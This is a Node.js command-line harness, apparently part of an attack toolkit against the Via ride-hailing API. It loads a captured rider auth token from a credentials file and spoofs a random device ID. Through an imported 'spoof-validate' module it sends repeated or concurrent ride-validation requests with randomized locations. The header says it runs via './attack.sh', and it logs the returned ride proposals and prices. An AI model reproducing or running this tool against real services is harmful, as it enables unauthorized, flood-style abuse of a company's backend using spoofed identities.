#!/usr/bin/env node
/**
 * CLI for spoof-validate. Reads credentials from repo-root via_credentials.json, calls sendValidate.
 * Run from repo root: ./attack.sh [--once] [--loop N] [--interval MS] [--concurrent N]
 */

const path = require("path");
const fs = require("fs");
const { sendValidate } = require("./spoof-validate.js");

const CREDENTIALS_PATH = path.join(process.cwd(), "via_credentials.json");

function uuid4() {
  return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (c) => {
    const r = (Math.random() * 16) | 0;
    const v = c === "x" ? r : (r & 0x3) | 0x8;
    return v.toString(16).toUpperCase();
  });
}

function loadCredentials() {
  let data;
  try {
    data = JSON.parse(fs.readFileSync(CREDENTIALS_PATH, "utf8"));
  } catch (e) {
    throw new Error(
      `Missing or invalid ${CREDENTIALS_PATH}. Run ./investigate.sh, book a ride, or copy via_credentials.json.example to via_credentials.json and fill.`
    );
  }
  const authToken = data.auth_token;
  const riderId = data.rider_id != null ? parseInt(data.rider_id, 10) : null;
  if (!authToken || riderId == null) {
    throw new Error("via_credentials.json must have auth_token and rider_id");
  }
  const o = data.origin && data.origin.lat != null ? data.origin : null;
  const d = data.destination && data.destination.lat != null ? data.destination : null;
  return {
    authToken,
    riderId,
    deviceId: uuid4(),
    origin: o,
    destination: d,
  };
}

function parseArgs() {
  const args = process.argv.slice(2);
  const out = { once: false, loop: 4, interval: 2000, concurrent: null, randomizeRequests: false };
  for (let i = 0; i < args.length; i++) {
    if (args[i] === "--once") { out.once = true; out.loop = 1; }
    else if (args[i] === "--loop" && args[i + 1] != null) {
      out.loop = parseInt(args[++i], 10) || 1;
      out.once = false;
    } else if (args[i] === "--interval" && args[i + 1] != null) out.interval = parseInt(args[++i], 10) || 1000;
    else if (args[i] === "--concurrent" && args[i + 1] != null && /^\d+$/.test(args[i + 1])) {
      out.concurrent = parseInt(args[++i], 10);
      out.once = false;
    } else if (args[i] === "--randomize-requests") out.randomizeRequests = true;
  }
  return out;
}

function log(label, value) {
  console.log(value === undefined ? `  ${label}` : `  ${label}: ${value}`);
}

async function main() {
  const args = parseArgs();
  const creds = loadCredentials();

  const n = args.concurrent != null ? args.concurrent : (args.once ? 1 : Math.max(1, args.loop));
  const randomizeLocations =
    args.randomizeRequests || !(creds.origin && creds.destination && creds.origin.lat != null && creds.destination.lat != null);

  console.log("Credentials (from via_credentials.json)");
  log("rider_id", creds.riderId);
  log("auth_token", creds.authToken ? `${creds.authToken.slice(0, 20)}...` : "(missing)");
  log("locations", randomizeLocations ? "random per request" : "from creds");
  if (args.concurrent != null) log("mode", `${n} concurrent`);
  console.log("");
  console.log(`Sending ${n} request${n === 1 ? "" : "s"}...`);
  console.log("");

  const results = await sendValidate({
    authToken: creds.authToken,
    riderId: creds.riderId,
    deviceId: creds.deviceId,
    origin: creds.origin,
    destination: creds.destination,
    randomizeLocations,
    count: args.concurrent == null ? n : undefined,
    intervalMs: args.interval,
    concurrent: args.concurrent != null ? n : undefined,
    dumpDir: __dirname,
    onProgress: (i, total, result, locations) => {
      const proposals = (result.body && result.body.proposals) || [];
      const okStr = result.ok ? "ok" : "fail";
      const locStr = locations ? ` ${locations.origin} → ${locations.destination}` : "";
      console.log(`[${i}/${total}] request done: ${result.status} ${okStr}${proposals.length ? ` proposals=${proposals.length}` : ""}${locStr}`);
    },
  });

  console.log("");
  results.forEach((result, i) => {
    console.log(`[${i + 1}/${n}] Response`);
    log("status", result.status);
    log("ok", result.ok);
    if (result.body) {
      const proposals = result.body.proposals ?? [];
      log("proposals_count", proposals.length);
      if (result.body.header_text) log("header_text", result.body.header_text);
      if (result.body.unavailable_providers?.length)
        log("unavailable_providers", result.body.unavailable_providers.join(", "));
      if (proposals.length && proposals[0].ride_info?.price) log("first_proposal_price", proposals[0].ride_info.price);
    }
    if (!result.ok) log("raw_preview", result.raw?.slice(0, 300) ?? "(empty)");
    console.log("");
  });
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
